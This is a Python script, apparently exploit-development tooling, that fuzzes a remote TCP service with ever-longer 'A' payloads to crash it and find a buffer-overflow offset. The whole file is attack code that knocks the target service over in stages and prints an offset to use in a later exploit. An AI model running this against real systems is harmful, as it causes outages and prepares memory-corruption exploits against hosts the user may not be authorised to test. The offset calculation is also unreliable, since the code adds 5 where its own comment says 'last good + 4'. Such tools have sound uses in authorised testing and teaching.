#!/usr/bin/env python3

import socket
import time
import sys
import argparse

def send_payload(ip, port, payload, timeout=5):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            s.send(bytes(payload, "latin-1"))
            s.recv(1024)
        return True
    except:
        return False

def fuzz(ip, port, prefix, start, step, stop=None):
    length = start
    last_good = start - step

    while True:
        payload = prefix + "A" * length
        print(f"Fuzzing with {length} bytes (excluding prefix)")

        success = send_payload(ip, port, payload)

        if not success:
            print(f"Crash at {length} bytes (excluding prefix)")
            return last_good  # Return the actual last successful length

        last_good = length

        if stop and length >= stop:
            return last_good

        length += step
        time.sleep(0.5)

def prompt_continue(message):
    print(f"\n{message}")
    print("Press [Enter] to continue or [q] then [Enter] to quit.")
    response = input("> ").strip().lower()
    if response == "q":
        print("User cancelled.")
        sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description="Fuzz to find exact offset to buffer overflow crash.")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port number")
    parser.add_argument("--prefix", default="", help="Optional prefix string before the payload")

    args = parser.parse_args()

    ip = args.ip
    port = args.port
    prefix = args.prefix

    # Phase 1: Step by 100s
    print("Starting Phase 1: Step by 100 bytes")
    crash_1 = fuzz(ip, port, prefix, start=100, step=100)

    prompt_continue(f"Crash at ~{crash_1 + 100} bytes. Continue with 10-byte increments?")

    # Phase 2: Step by 10s
    print("Starting Phase 2: Step by 10 bytes")
    crash_2 = fuzz(ip, port, prefix, start=crash_1, step=10, stop=crash_1 + 100)

    prompt_continue(f"Crash at ~{crash_2 + 10} bytes. Continue with 1-byte increments?")

    # Phase 3: Step by 1s
    print("Starting Phase 3: Step by 1 byte")
    crash_3 = fuzz(ip, port, prefix, start=crash_2, step=1, stop=crash_2 + 10)

    offset = crash_3 + 5  # Correct offset is last good + 4
    print(f"\nExact offset found: Offset = {offset} bytes")

if __name__ == "__main__":
    main()
